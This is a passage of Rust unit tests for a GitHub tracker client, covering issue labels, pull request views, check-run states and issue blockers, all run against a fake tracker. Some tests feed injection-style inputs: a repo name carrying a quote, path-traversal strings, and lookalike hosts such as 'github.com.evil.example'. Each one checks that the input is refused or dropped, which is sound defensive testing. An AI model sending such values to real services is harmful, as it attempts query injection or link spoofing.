            .map(|n| (format!("i{n}"), labelled(*n, "OPEN", &["factory:stuck"])))
            .collect();
        json!({ "data": data }).to_string()
    }

    /// GitHub's answer for an issue the read found.
    fn labelled(number: u64, state: &str, labels: &[&str]) -> Value {
        json!({
            "number": number,
            "state": state,
            "labels": {"nodes": labels.iter().map(|name| json!({"name": name})).collect::<Vec<_>>()},
        })
    }

    #[test]
    fn issue_labels_reads_the_labels_and_state_of_each_number_in_one_call() {
        let fake = FakeTracker::new();
        fake.on(
            issue_labels_call(&[5, 7]),
            Answer::ok(
                json!({"data": {
                    "i5": labelled(5, "OPEN", &["factory:stuck", "type:fix"]),
                    "i7": labelled(7, "CLOSED", &["factory:stuck"]),
                }})
                .to_string(),
            ),
        );
        // Asked out of order and twice: each number is read once, in one call.
        let read = issue_labels(&fake, REPO, &[7, 5, 7]).unwrap();
        assert_eq!(fake.calls().len(), 1, "{:?}", fake.calls());
        assert_eq!(
            read.into_iter().collect::<Vec<_>>(),
            vec![
                (
                    5,
                    IssueLabels {
                        number: 5,
                        labels: vec!["factory:stuck".into(), "type:fix".into()],
                        closed: false,
                    }
                ),
                (
                    7,
                    IssueLabels {
                        number: 7,
                        labels: vec!["factory:stuck".into()],
                        closed: true,
                    }
                ),
            ]
        );
    }

    /// A number GitHub has no issue for answers null, and one it has as something other than an
    /// issue answers an empty object: neither is in the answer, and neither fails the read.
    #[test]
    fn issue_labels_leaves_out_a_number_github_does_not_return() {
        let fake = FakeTracker::new();
        fake.on(
            issue_labels_call(&[5, 8, 9]),
            Answer::ok(
                json!({"data": {
                    "i5": labelled(5, "OPEN", &[]),
                    "i8": {},
                    "i9": null,
                }})
                .to_string(),
            ),
        );
        let read = issue_labels(&fake, REPO, &[5, 8, 9]).unwrap();
        assert_eq!(read.keys().copied().collect::<Vec<_>>(), vec![5]);
        assert_eq!(read[&5].labels, Vec::<String>::new());
    }

    /// A URL GitHub resolves to an issue with another number, such as one moved elsewhere, is
    /// not the issue asked for: it is left out, not read as that number's labels.
    #[test]
    fn issue_labels_leaves_out_an_issue_github_answers_with_another_number() {
        let fake = FakeTracker::new();
        fake.on(
            issue_labels_call(&[5, 6]),
            Answer::ok(
                json!({"data": {
                    "i5": labelled(12, "OPEN", &["factory:stuck"]),
                    "i6": labelled(6, "OPEN", &["factory:stuck"]),
                }})
                .to_string(),
            ),
        );
        let read = issue_labels(&fake, REPO, &[5, 6]).unwrap();
        assert_eq!(read.keys().copied().collect::<Vec<_>>(), vec![6]);
    }

    #[test]
    fn issue_labels_of_no_number_makes_no_call() {
        let fake = FakeTracker::new();
        assert!(issue_labels(&fake, REPO, &[]).unwrap().is_empty());
        assert!(fake.calls().is_empty());
    }

    /// More numbers than one call reads are read 100 to a call, lowest first, so no query
    /// outgrows the argument size or GitHub's limits however many issues are asked for.
    #[test]
    fn issue_labels_reads_more_than_100_numbers_100_to_a_call() {
        let fake = FakeTracker::new();
        let first: Vec<u64> = (1..=100).collect();
        fake.on(issue_labels_call(&first), Answer::ok(all_stuck(&first)));
        fake.on(
            issue_labels_call(&[101]),
            Answer::ok(json!({"data": {"i101": labelled(101, "CLOSED", &[])}}).to_string()),
        );
        let asked: Vec<u64> = (1..=101).rev().collect();
        let read = issue_labels(&fake, REPO, &asked).unwrap();
        assert_eq!(fake.calls().len(), 2, "{:?}", fake.calls());
        assert_eq!(
            read.keys().copied().collect::<Vec<_>>(),
            (1..=101).collect::<Vec<_>>()
        );
        assert!(read[&101].closed);
        assert!(!read[&100].closed);
    }

    /// A failed call fails the whole read, whichever hundred it was reading.
    #[test]
    fn issue_labels_fails_when_any_of_its_calls_fails() {
        let first: Vec<u64> = (1..=100).collect();
        let fake = FakeTracker::answering([Answer::ok(all_stuck(&first)), Answer::fail(1, "boom")]);
        let asked: Vec<u64> = (1..=101).collect();
        let error = issue_labels(&fake, REPO, &asked).unwrap_err();
        assert!(is_failed(&error), "{error}");
        assert_eq!(fake.calls().len(), 2, "{:?}", fake.calls());
    }

    #[test]
    fn issue_labels_errors_are_typed() {
        let failing = FakeTracker::answering([Answer::fail(1, "boom")]);
        let failed = issue_labels(&failing, REPO, &[5]).unwrap_err();
        assert!(is_failed(&failed), "{failed}");
        assert!(failed.to_string().contains("status 1"), "{failed}");

        for wrong in [
            // Not an answer at all.
            "[]".to_string(),
            // No data.
            json!({"data": null}).to_string(),
            // A number asked for that the answer does not name.
            json!({"data": {}}).to_string(),
            // An issue without its labels.
            json!({"data": {"i5": {"number": 5, "state": "OPEN"}}}).to_string(),
            // An issue in a state GitHub does not have.
            json!({"data": {"i5": labelled(5, "GONE", &[])}}).to_string(),
        ] {
            let fake = FakeTracker::answering([Answer::ok(wrong.clone())]);
            let error = issue_labels(&fake, REPO, &[5]).unwrap_err();
            assert!(is_parse(&error), "{wrong}: {error}");
        }
    }

    /// The repo is written into the query, so one that is not a plain `owner/name` is refused
    /// before any call.
    #[test]
    fn issue_labels_refuses_a_repo_not_written_as_owner_name_before_any_call() {
        for repo in [
            "rawphp",
            "rawphp/soft\"fac",
            "rawphp/softfac/x",
            "../softfac",
            "/softfac",
        ] {
            let fake = FakeTracker::new();
            let error = issue_labels(&fake, repo, &[5]).unwrap_err();
            assert!(is_refused(&error), "{repo}: {error}");
            assert!(fake.calls().is_empty(), "{repo}");
        }
    }

    // Pull requests.

    const PR_VIEW: &str = "{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"t3code/2bb65018\",\"headRefOid\":\"4f1c2d3e4a5b60718293a4b5c6d7e8f901234567\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":2,\"state\":\"OPEN\"}";

    fn pr_view(state: &str, draft: bool) -> String {
        format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"headRefOid\":\"{HEAD_SHA}\",\"isCrossRepository\":false,\"isDraft\":{draft},\"mergeable\":\"MERGEABLE\",\"number\":9,\"state\":\"{state}\"}}"
        )
    }

    fn pr_view_call(number: &str) -> Vec<String> {
        args(&[
            "pr",
            "view",
            number,
            "--repo",
            REPO,
            "--json",
            "number,isDraft,state,headRefName,isCrossRepository,baseRefName,headRefOid,mergeable,createdAt",
        ])
    }

    #[test]
    fn pull_request_reads_the_real_shape_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(PR_VIEW)]);
        let pr = pull_request(&fake, REPO, 2).unwrap();
        assert_eq!(fake.calls(), vec![pr_view_call("2")]);
        assert_eq!(
            pr,
            Some(PullRequest {
                number: 2,
                is_draft: true,
                open: true,
                merged: false,
                head_ref: "t3code/2bb65018".into(),
                cross_repository: false,
                base_ref: "main".into(),
                head_sha: HEAD_SHA.into(),
                mergeable: Mergeable::Mergeable,
                created_at: "2026-10-29T05:50:00Z".into(),
            })
        );
    }

    #[test]
    fn pull_request_reads_githubs_mergeable_state_and_anything_else_as_unknown() {
        for (raw, mergeable) in [
            ("MERGEABLE", Mergeable::Mergeable),
            ("CONFLICTING", Mergeable::Conflicting),
            ("UNKNOWN", Mergeable::Unknown),
            ("SOMETHING_NEW", Mergeable::Unknown),
        ] {
            let fake = FakeTracker::answering([Answer::ok(
                PR_VIEW.replace("\"MERGEABLE\"", &format!("\"{raw}\"")),
            )]);
            let pr = pull_request(&fake, REPO, 2).unwrap().unwrap();
            assert_eq!(fake.calls(), vec![pr_view_call("2")], "{raw}");
            assert_eq!(pr.mergeable, mergeable, "{raw}");
        }
    }

    #[test]
    fn pull_request_says_when_it_is_merged_and_is_then_not_open() {
        let merged = FakeTracker::answering([Answer::ok(
            PR_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"MERGED\""),
        )]);
        let pr = pull_request(&merged, REPO, 2).unwrap().unwrap();
        assert!(pr.merged);
        assert!(!pr.open);
        let closed = FakeTracker::answering([Answer::ok(
            PR_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"CLOSED\""),
        )]);
        let other = pull_request(&closed, REPO, 2).unwrap().unwrap();
        assert!(!other.merged);
        assert!(!other.open);
    }

    #[test]
    fn pull_request_from_a_fork_and_into_another_base_says_so() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"release/1.0\",\"headRefName\":\"t3code/x\",\"headRefOid\":\"{HEAD_SHA}\",\"isCrossRepository\":true,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":4,\"state\":\"OPEN\"}}"
        ))]);
        let pr = pull_request(&fake, REPO, 4).unwrap().unwrap();
        assert!(pr.cross_repository);
        assert_eq!(pr.base_ref, "release/1.0");
        assert_eq!(pr.head_ref, "t3code/x");
    }

    #[test]
    fn a_pull_request_view_without_the_fork_or_base_fields_is_a_parse_error() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"headRefName\":\"x\",\"headRefOid\":\"{HEAD_SHA}\",\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}}"
        ))]);
        assert!(is_parse(&pull_request(&fake, REPO, 3).unwrap_err()));
    }

    #[test]
    fn a_pull_request_view_without_the_head_commit_is_a_parse_error() {
        let fake = FakeTracker::answering([Answer::ok(
            "{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}",
        )]);
        assert!(is_parse(&pull_request(&fake, REPO, 3).unwrap_err()));
    }

    #[test]
    fn pull_request_reads_the_head_commit_as_given() {
        let sha = "0123456789abcdef0123456789abcdef01234567";
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"headRefOid\":\"{sha}\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}}"
        ))]);
        assert_eq!(pull_request(&fake, REPO, 3).unwrap().unwrap().head_sha, sha);
    }

    #[test]
    fn a_pull_request_whose_creation_time_is_not_a_utc_second_is_a_parse_error() {
        for at in [
            "",
            "2026-10-29T05:50:00+10:00",
            "2026-10-29T05:50:00.5Z",
            "yesterday",
        ] {
            let fake =
                FakeTracker::answering([Answer::ok(PR_VIEW.replace("2026-10-29T05:50:00Z", at))]);
            let error = pull_request(&fake, REPO, 2).unwrap_err();
            assert!(is_parse(&error), "{at}: {error}");
        }
    }

    #[test]
    fn a_pull_request_whose_head_commit_is_not_a_full_id_is_a_parse_error() {
        for sha in [
            String::new(),
            "4f1c2d3".to_string(),
            format!("{HEAD_SHA}0"),
            HEAD_SHA.replace('4', "g"),
        ] {
            let fake = FakeTracker::answering([Answer::ok(PR_VIEW.replace(HEAD_SHA, &sha))]);
            let error = pull_request(&fake, REPO, 2).unwrap_err();
            assert!(is_parse(&error), "{sha}: {error}");
        }
    }

    #[test]
    fn pull_request_merged_and_closed_are_not_open() {
        for state in ["MERGED", "CLOSED"] {
            let fake = FakeTracker::answering([Answer::ok(pr_view(state, false))]);
            let pr = pull_request(&fake, REPO, 9).unwrap().unwrap();
            assert!(!pr.open, "{state}");
            assert!(!pr.is_draft, "{state}");
        }
    }

    #[test]
    fn a_pull_request_that_does_not_exist_is_null() {
        for stderr in [
            "GraphQL: Could not resolve to a PullRequest with the number of 999. (repository.pullRequest)\n",
            "graphql: could not resolve to a pullrequest with the number of 999.",
            "GRAPHQL: COULD NOT RESOLVE TO A PULLREQUEST",
        ] {
            let fake = FakeTracker::answering([Answer::fail(1, stderr)]);
            assert_eq!(pull_request(&fake, REPO, 999).unwrap(), None, "{stderr}");
        }
    }

    #[test]
    fn any_other_pull_request_failure_stays_an_error() {
        for (stderr, want) in [
            ("HTTP 502: Bad Gateway", OtherKind::NoAnswer),
            ("Could not resolve host: api.github.com", OtherKind::Failed),
            (
                "Could not resolve to an Issue with the number of 5.",
                OtherKind::Failed,
            ),
            ("", OtherKind::Failed),
        ] {
            let fake = FakeTracker::answering([Answer::fail(1, stderr)]);
            let error = pull_request(&fake, REPO, 999).unwrap_err();
            assert!(
                matches!(&error, TrackerError::Other { kind, .. } if *kind == want),
                "{stderr}: {error}"
            );
            assert!(error.to_string().contains("status 1"), "{stderr}: {error}");
        }
        let fake = FakeTracker::new();
        let error = pull_request(&fake, REPO, 999).unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other { kind: OtherKind::NotStarted, message: m } if m.contains("cannot start")),
            "{error}"
        );
    }

    #[test]
    fn pull_request_errors_are_typed() {
        let failed = FakeTracker::answering([Answer::fail(1, "no pull requests found")]);
        assert!(is_failed(&pull_request(&failed, REPO, 2).unwrap_err()));
        let parse = FakeTracker::answering([Answer::ok("{}")]);
        assert!(is_parse(&pull_request(&parse, REPO, 2).unwrap_err()));
    }

    #[test]
    fn issue_and_pull_request_calls_use_the_number_they_are_given() {
        let fake = FakeTracker::answering([
            Answer::ok(issue_json(&["factory:ready"], &[], "\"b\"")),
            Answer::ok(pr_view("OPEN", true)),
        ]);
        issue(&fake, REPO, 7).unwrap();
        pull_request(&fake, REPO, 3).unwrap();
        assert_eq!(fake.calls(), vec![issue_view_call("7"), pr_view_call("3")]);
    }

    // Checks.

    fn run(name: &str, status: &str, conclusion: Option<&str>) -> serde_json::Value {
        serde_json::json!({
            "id": 1,
            "name": name,
            "status": status,
            "conclusion": conclusion,
            "html_url": format!("https://github.com/rawphp/softfac/actions/runs/1/job/{name}"),
            "app": {"slug": "github-actions"},
        })
    }

    fn with_url(mut run: serde_json::Value, url: serde_json::Value) -> serde_json::Value {
        run["html_url"] = url;
        run
    }

    fn page(runs: &[serde_json::Value]) -> String {
        serde_json::Value::Array(runs.to_vec()).to_string()
    }

    fn checks_call() -> Vec<String> {
        args(&[
            "api",
            &format!(
                "repos/rawphp/softfac/commits/{BASE_SHA}/check-runs?per_page=100&filter=latest"
            ),
            "--paginate",
            "--jq",
            "[.check_runs[] | {name, status, conclusion, html_url}]",
        ])
    }

    fn names(names: &[&str]) -> Vec<String> {
        args(names)
    }

    /// The one check `gate` over `runs`.
    fn gate(runs: &[serde_json::Value]) -> CheckStatus {
        let fake = FakeTracker::answering([Answer::ok(page(runs))]);
        checks(&fake, REPO, BASE_SHA, &names(&["gate"]))
            .unwrap()
            .remove(0)
    }

    #[test]
    fn checks_reads_the_check_runs_of_the_commit_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(page(&[run(
            "gate",
            "completed",
            Some("success"),
        )]))]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap();
        assert_eq!(fake.calls(), vec![checks_call()]);
        assert_eq!(
            got,
            vec![CheckStatus {
                name: "gate".into(),
                state: CheckState::Passed,
                conclusion: "success".into(),
                url: Some("https://github.com/rawphp/softfac/actions/runs/1/job/gate".into()),
            }]
        );
    }

    #[test]
    fn checks_answers_for_each_name_asked_in_the_order_asked_and_ignores_other_runs() {
        let fake = FakeTracker::answering([Answer::ok(page(&[
            run("lint", "completed", Some("success")),
            run("other", "completed", Some("failure")),
            run("gate", "completed", Some("success")),
        ]))]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate", "lint"])).unwrap();
        assert_eq!(
            got.iter()
                .map(|c| (c.name.as_str(), c.state))
                .collect::<Vec<_>>(),
            vec![("gate", CheckState::Passed), ("lint", CheckState::Passed)]
        );
    }

    #[test]
    fn a_completed_run_passes_on_success_and_neutral_and_fails_on_anything_else() {
        for conclusion in ["success", "neutral"] {
            let got = gate(&[run("gate", "completed", Some(conclusion))]);
            assert_eq!(got.state, CheckState::Passed, "{conclusion}");
        }
        for conclusion in [
            "failure",
            "cancelled",
            "timed_out",
            "action_required",
            "stale",
            "startup_failure",
            "something_new",
        ] {
            let got = gate(&[run("gate", "completed", Some(conclusion))]);
            assert_eq!(got.state, CheckState::Failed, "{conclusion}");
            assert_eq!(got.conclusion, conclusion);
        }
        // Completed with no conclusion is not a pass.
        let got = gate(&[run("gate", "completed", None)]);
        assert_eq!(got.state, CheckState::Failed);
        assert_eq!(got.conclusion, "completed");
    }

    #[test]
    fn a_run_that_has_not_completed_is_pending() {
        for status in ["queued", "in_progress", "waiting", "pending", "requested"] {
            let got = gate(&[run("gate", status, None)]);
            assert_eq!(got.state, CheckState::Pending, "{status}");
            assert_eq!(got.conclusion, status);
        }
    }

    #[test]
    fn a_check_with_no_run_is_missing_and_not_pending() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap();
        assert_eq!(
            got,
            vec![CheckStatus {
                name: "gate".into(),
                state: CheckState::Missing,
                conclusion: String::new(),
                url: None,
            }]
        );
    }

    #[test]
    fn a_name_that_is_not_exactly_the_runs_is_missing() {
        let got = gate(&[run("Gate", "completed", Some("success"))]);
        assert_eq!(got.state, CheckState::Missing);
    }

    #[test]
    fn a_skipped_run_is_not_a_result_so_the_check_stays_missing() {
        // The factory's pull request is a draft until the checks pass, and a job guarded by
        // "not a draft" is skipped on it: nothing ran, so nothing passed.
        let got = gate(&[run("gate", "completed", Some("skipped"))]);
        assert_eq!(got.state, CheckState::Missing);
        assert_eq!(got.conclusion, "skipped");
    }

    #[test]
    fn several_runs_of_one_name_fail_before_they_pend_and_pend_before_they_pass() {
        type Run = (&'static str, Option<&'static str>);
        let state = |a: Run, b: Run| gate(&[run("gate", a.0, a.1), run("gate", b.0, b.1)]).state;
        let success: Run = ("completed", Some("success"));
        let neutral: Run = ("completed", Some("neutral"));
        let failure: Run = ("completed", Some("failure"));
        let skipped: Run = ("completed", Some("skipped"));
        let going: Run = ("in_progress", None);
        assert_eq!(state(success, failure), CheckState::Failed);
        // The conclusion and the link are the deciding run's, whichever came first.
        let mixed = gate(&[
            run("gate", "completed", Some("success")),
            with_url(
                run("gate", "completed", Some("failure")),
                "https://github.com/x/y/runs/2".into(),
            ),
        ]);
        assert_eq!(
            mixed,
            CheckStatus {
                name: "gate".into(),
                state: CheckState::Failed,
                conclusion: "failure".into(),
                url: Some("https://github.com/x/y/runs/2".into()),
            }
        );
        assert_eq!(state(going, success), CheckState::Pending);
        assert_eq!(state(success, neutral), CheckState::Passed);
        // A failure is not hidden by a run that is going again, in either order.
        assert_eq!(state(failure, going), CheckState::Failed);
        assert_eq!(state(going, failure), CheckState::Failed);
        // One skipped run among passing ones is not every run passing.
        assert_eq!(state(success, skipped), CheckState::Missing);
        assert_eq!(state(skipped, success), CheckState::Missing);
        // A skipped run does not hide one that is still going, or one that failed.
        assert_eq!(state(skipped, going), CheckState::Pending);
        assert_eq!(state(going, skipped), CheckState::Pending);
        assert_eq!(state(skipped, failure), CheckState::Failed);
        assert_eq!(state(failure, skipped), CheckState::Failed);
    }

    #[test]
    fn of_several_runs_that_decide_alike_the_first_one_listed_is_reported() {
        let got = gate(&[
            with_url(
                run("gate", "completed", Some("failure")),
                "https://github.com/x/y/runs/1".into(),
            ),
            with_url(
                run("gate", "completed", Some("cancelled")),
                "https://github.com/x/y/runs/2".into(),
            ),
        ]);
        assert_eq!(
            got,
            CheckStatus {
                name: "gate".into(),
                state: CheckState::Failed,
                conclusion: "failure".into(),
                url: Some("https://github.com/x/y/runs/1".into()),
            }
        );
    }

    #[test]
    fn checks_reads_every_page() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{}\n{}",
            page(&[run("gate", "completed", Some("success"))]),
            page(&[run("lint", "in_progress", None)])
        ))]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate", "lint"])).unwrap();
        assert_eq!(got[0].state, CheckState::Passed);
        assert_eq!(got[1].state, CheckState::Pending);
    }

    #[test]
    fn checks_keeps_a_details_link_only_when_it_is_a_github_one() {
        for url in [
            "https://evil.example/x",
            "https://github.com.evil.example/x",
            "http://github.com/x",
        ] {
            let got = gate(&[with_url(
                run("gate", "completed", Some("failure")),
                url.into(),
            )]);
            assert_eq!(got.url, None, "{url}");
        }
        let none = gate(&[with_url(
            run("gate", "completed", Some("failure")),
            serde_json::Value::Null,
        )]);
        assert_eq!(none.url, None);
    }

    #[test]
    fn checks_refuses_a_commit_that_is_not_a_full_id_before_any_call() {
        for sha in [
            String::new(),
            "main".to_string(),
            "9f8e7d6".to_string(),
            "../x".to_string(),
            BASE_SHA.replace('9', "g"),
        ] {
            let fake = FakeTracker::answering([Answer::ok("[]")]);
            let error = checks(&fake, REPO, &sha, &names(&["gate"])).unwrap_err();
            assert!(is_refused(&error), "{sha}: {error}");
            assert!(fake.calls().is_empty(), "{sha}");
        }
    }

    #[test]
    fn checks_refuses_an_answer_that_is_not_a_list_of_runs() {
        for answer in ["{}", "not json", "[{\"name\":\"gate\"}]"] {
            let fake = FakeTracker::answering([Answer::ok(answer)]);
            let error = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn checks_that_gh_cannot_read_is_the_gh_failure() {
        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
        let error = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
    }

    // Blockers.

    fn blocked_by_call(issue: &str) -> Vec<String> {
        args(&[
            "api",
            &format!("repos/rawphp/softfac/issues/{issue}/dependencies/blocked_by"),
            "--paginate",
        ])
    }

    fn blocker_row(number: u64, state: &str, repo: &str) -> String {
        format!(
            "{{\"id\":{number},\"number\":{number},\"state\":\"{state}\",\"title\":\"t\",\"repository_url\":\"https://api.github.com/repos/{repo}\",\"labels\":[]}}"
        )
    }

    fn open_blocker(number: u64, repo: &str) -> Blocker {
        Blocker {
            repo: repo.into(),
            number,
        }
    }

    #[test]
    fn an_issue_with_no_blockers_has_no_open_blockers() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        assert_eq!(open_blockers(&fake, REPO, 14).unwrap(), vec![]);
        assert_eq!(fake.calls(), vec![blocked_by_call("14")]);
    }

    #[test]
    fn a_closed_blocker_is_resolved_whatever_closed_it() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{}]",
            blocker_row(13, "closed", "rawphp/softfac"),
            blocker_row(12, "closed", "rawphp/other")
        ))]);
        assert_eq!(open_blockers(&fake, REPO, 14).unwrap(), vec![]);
    }

    #[test]
    fn only_the_exact_rest_state_closed_resolves_a_blocker_any_other_state_still_blocks() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{},{}]",
            blocker_row(13, "unknown", "rawphp/softfac"),
            blocker_row(12, "CLOSED", "rawphp/softfac"),
            blocker_row(11, "closed", "rawphp/softfac")
        ))]);
        assert_eq!(
            open_blockers(&fake, REPO, 14).unwrap(),
            vec![
                open_blocker(13, "rawphp/softfac"),
                open_blocker(12, "rawphp/softfac")
            ]
        );
    }

    #[test]
    fn open_blockers_keep_the_repo_they_are_in() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{},{}]",
            blocker_row(13, "open", "rawphp/softfac"),
            blocker_row(12, "closed", "rawphp/softfac"),
            blocker_row(7, "open", "acme/widgets")
        ))]);
        assert_eq!(
            open_blockers(&fake, REPO, 14).unwrap(),
            vec![
                open_blocker(13, "rawphp/softfac"),
                open_blocker(7, "acme/widgets")
            ]
        );
    }

    #[test]
    fn blockers_on_every_page_are_read() {
        // `gh api --paginate` may print each page as its own array.
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{}][{}]",
            blocker_row(1, "closed", "rawphp/softfac"),
            blocker_row(2, "open", "rawphp/softfac")
        ))]);
        assert_eq!(
            open_blockers(&fake, REPO, 14).unwrap(),
            vec![open_blocker(2, "rawphp/softfac")]
        );
    }

    #[test]
    fn blockers_that_cannot_be_read_are_an_error() {
        let spawn = FakeTracker::new();
        let error = open_blockers(&spawn, REPO, 14).unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other { kind: OtherKind::NotStarted, message: m } if m.contains("cannot start")),
            "{error}"
        );

        let failed = FakeTracker::answering([Answer::fail(1, "Not Found")]);
        assert!(is_failed(&open_blockers(&failed, REPO, 14).unwrap_err()));

        for stdout in ["oops", "", "{\"message\":\"x\"}"] {
            let fake = FakeTracker::answering([Answer::ok(stdout)]);
            let error = open_blockers(&fake, REPO, 14).unwrap_err();
            assert!(is_parse(&error), "{stdout}: {error}");
        }
    }

    #[test]
    fn an_open_blocker_whose_repo_is_unknown_is_an_error_not_a_guess() {
        for row in [
            "{\"number\":3,\"state\":\"open\"}",
            "{\"number\":3,\"state\":\"open\",\"repository_url\":\"x\"}",
        ] {
            let fake = FakeTracker::answering([Answer::ok(format!("[{row}]"))]);
            let error = open_blockers(&fake, REPO, 14).unwrap_err();
            assert!(is_parse(&error), "{row}: {error}");
        }
    }

    fn body_call(issue: &str) -> Vec<String> {
        args(&["issue", "view", issue, "--repo", REPO, "--json", "body"])
    }

    fn rest_call(repo: &str, issue: &str) -> Vec<String> {
        args(&["api", &format!("repos/{repo}/issues/{issue}")])
    }

    fn body_reply(body: &str) -> String {
        serde_json::json!({ "body": body }).to_string()
    }

    #[test]
    fn text_blockers_of_a_body_without_the_section_read_nothing_more() {
        let fake = FakeTracker::answering([Answer::ok(body_reply("## Cause\nSee #5\n"))]);
        assert_eq!(text_blockers(&fake, REPO, 14).unwrap(), vec![]);
        assert_eq!(fake.calls(), vec![body_call("14")]);

        let empty = FakeTracker::answering([Answer::ok("{\"body\":null}")]);
        assert_eq!(text_blockers(&empty, REPO, 14).unwrap(), vec![]);
    }

    #[test]
    fn text_blockers_are_the_named_issues_that_are_not_closed() {
        let fake = FakeTracker::answering([
            Answer::ok(body_reply(
                "## Depends on\n#13, acme/widgets#7 and #5\n\n## Fix\n#99\n",
            )),
            Answer::ok("{\"number\":13,\"state\":\"open\",\"title\":\"t\"}"),
            Answer::ok("{\"number\":7,\"state\":\"closed\"}"),
            Answer::ok("{\"number\":5,\"state\":\"open\"}"),
        ]);
        assert_eq!(
            text_blockers(&fake, REPO, 14).unwrap(),
            vec![open_blocker(13, REPO), open_blocker(5, REPO)]
        );
        assert_eq!(
            fake.calls(),
            vec![
                body_call("14"),
                rest_call(REPO, "13"),
                rest_call("acme/widgets", "7"),
                rest_call(REPO, "5"),
            ]
        );
    }

    #[test]
    fn text_blockers_resolved_once_every_named_issue_is_closed() {
        let fake = FakeTracker::answering([
            Answer::ok(body_reply("## Depends on\n#13\n")),
            Answer::ok("{\"state\":\"closed\"}"),
        ]);
        assert_eq!(text_blockers(&fake, REPO, 14).unwrap(), vec![]);
    }

    #[test]
    fn only_the_exact_rest_state_closed_resolves_a_named_issue_any_other_still_blocks() {
        let fake = FakeTracker::answering([
            Answer::ok(body_reply("## Depends on\n#13, #12, #11\n")),
            Answer::ok("{\"state\":\"CLOSED\"}"),
            Answer::ok("{\"state\":\"unknown\"}"),
            Answer::ok("{\"state\":\"closed\"}"),
        ]);
        assert_eq!(
            text_blockers(&fake, REPO, 14).unwrap(),
            vec![open_blocker(13, REPO), open_blocker(12, REPO)]
        );
    }

    #[test]
    fn a_depends_on_section_naming_more_than_the_cap_is_an_error_before_any_is_read() {
        let refs = |count: usize| {
            (1..=count)
                .map(|at| format!("#{at}"))
                .collect::<Vec<_>>()
                .join(" ")
        };

        let over = FakeTracker::answering([Answer::ok(body_reply(&format!(
            "## Depends on\n{}\n",
            refs(MAX_DEPENDS_ON + 1)
        )))]);
        assert!(is_parse(&text_blockers(&over, REPO, 14).unwrap_err()));
        assert_eq!(over.calls(), vec![body_call("14")]);

        let at_cap = FakeTracker::answering(
            std::iter::once(Answer::ok(body_reply(&format!(
                "## Depends on\n{}\n",
                refs(MAX_DEPENDS_ON)
            ))))
            .chain((0..MAX_DEPENDS_ON).map(|_| Answer::ok("{\"state\":\"closed\"}"))),
        );
        assert_eq!(text_blockers(&at_cap, REPO, 14).unwrap(), vec![]);
        assert_eq!(at_cap.calls().len(), MAX_DEPENDS_ON + 1);
    }

    #[test]
    fn a_named_issue_that_cannot_be_read_is_an_error_not_a_resolved_blocker() {
        let body = body_reply("## Depends on\n#13, #5\n");
        let missing = FakeTracker::answering([
            Answer::ok(body.clone()),
            Answer::ok("{\"state\":\"closed\"}"),
            Answer::fail(1, "gh: Not Found (HTTP 404)"),
        ]);
        let error = text_blockers(&missing, REPO, 14).unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");

        let oops = FakeTracker::answering([Answer::ok(body.clone()), Answer::ok("oops")]);
        assert!(is_parse(&text_blockers(&oops, REPO, 14).unwrap_err()));

        let empty = FakeTracker::answering([Answer::ok(body), Answer::ok("{}")]);
        assert!(is_parse(&text_blockers(&empty, REPO, 14).unwrap_err()));
    }

    #[test]
    fn a_body_that_cannot_be_read_is_an_error() {
        let failed = FakeTracker::answering([Answer::fail(1, "boom")]);
        assert!(is_failed(&text_blockers(&failed, REPO, 14).unwrap_err()));
        let oops = FakeTracker::answering([Answer::ok("oops")]);
        assert!(is_parse(&text_blockers(&oops, REPO, 14).unwrap_err()));
    }

    // Pull requests on a head.

    const PR_LIST_FIELDS: &str = "number,url,headRefName,baseRefName,isCrossRepository,author";

    fn listed_pr(number: u64, head: &str) -> String {
        serde_json::json!({
            "number": number,
            "url": format!("https://github.com/rawphp/softfac/pull/{number}"),
            "state": "OPEN",
            "headRefName": head,
            "baseRefName": "main",
            "isCrossRepository": false,
            "author": {"login": "rawphp"},
        })
        .to_string()
    }

    fn pr_list_call(head: &str) -> Vec<String> {
        args(&[
            "pr",
            "list",
            "--repo",
            REPO,
            "--state",
